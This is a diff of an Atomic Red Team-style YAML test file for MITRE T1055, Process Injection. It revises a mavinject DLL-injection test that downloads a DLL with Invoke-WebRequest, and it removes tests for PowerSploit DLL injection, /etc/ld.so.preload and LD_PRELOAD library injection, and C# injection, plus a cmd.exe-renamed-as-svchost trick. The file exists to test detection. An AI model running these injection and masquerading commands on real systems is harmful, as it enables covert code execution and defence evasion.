@@ -1,124 +1,36 @@
----
 attack_technique: T1055
 display_name: Process Injection
-
 atomic_tests:
 - name: Process Injection via mavinject.exe
+  auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
   description: |
-    Windows 10 Utility To Inject DLLS
+    Windows 10 Utility To Inject DLLS.
 
+    Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
+    With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
+    process_id:
+      description: PID of input_arguments
+      type: Integer
+      default: (Start-Process notepad -PassThru).id
     dll_payload:
       description: DLL to Inject
       type: Path
       default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
-    process_id:
-      description: PID of input_arguments
-      type: Int
-      default: (get-process spoolsv).id
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Utility to inject must exist on disk at specified location (#{dll_payload})
+    prereq_command: |
+      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
   executor:
-    name: powershell
-    elevation_required: true
     command: |
       $mypid = #{process_id}
       mavinject $mypid /INJECTRUNNING #{dll_payload}
-
-- name: Process Injection via PowerSploit
-  description: |
-    PowerShell Injection using [PowerSploit Invoke-DLLInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)
-
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    dll_payload:
-      description: DLL to Inject
-      type: Path
-      default: T1055.dll
-    process_id:
-      description: PID of input_arguments
-      type: Int
-      default: (get-process spoolsv).id
-  executor:
     name: powershell
     elevation_required: true
-    command: |
-      $mypid = #{process_id}
-      Invoke-DllInjection.ps1 -ProcessID $mypid -Dll #{dll_payload}
-
-- name: Shared Library Injection via /etc/ld.so.preload
-  description: |
-    This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package. 
-  supported_platforms:
-    - linux
-  input_arguments:
-    path_to_shared_library:
-      description: Path to a shared library object
-      type: Path
-      default: ../bin/T1055.so
-  executor:
-    name: bash
-    elevation_required: true # indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false
-    command: |
-      echo #{path_to_shared_library} > /etc/ld.so.preload
-
-- name: Shared Library Injection via LD_PRELOAD
-  description: |
-    This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.
-  supported_platforms:
-    - linux
-  input_arguments:
-    path_to_shared_library:
-      description: Path to a shared library object
-      type: Path
-      default: /opt/AtomicRedTeam/atomics/T1055/bin/T1055.so
-  executor:
-    name: bash
-    elevation_required: false # indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false
-    command: |
-      LD_PRELOAD=#{path_to_shared_library} ls
-
-- name: Process Injection via C#
-  description: |
-    Process Injection using C#
-    reference: https://github.com/pwndizzle/c-sharp-memory-injection
-    Excercises Five Techniques
-    1. Process injection
-    2. ApcInjectionAnyProcess
-    3. ApcInjectionNewProcess
-    4. IatInjection
-    5. ThreadHijack
-
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    exe_binary:
-      description: Output Binary
-      type: Path
-      default: T1055.exe
-  executor:
-    name: command_prompt
-    command: |
-      .\bin\#{exe_binary}
-
-- name: svchost writing a file to a UNC path
-  description: | 
-    svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
-    This works by copying cmd.exe to a file, naming it svchost.exe, then copying a file to the localhost\c$ folder.
-  supported_platforms:
-    - windows
-
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      copy C:\Windows\System32\cmd.exe C:\svchost.exe
-      C:\svchost.exe /c echo T1055 > \\localhost\c$\T1055.txt
-    cleanup_command: |
-      del C:\T1055.txt
-      del C:\svchost.exe
-      
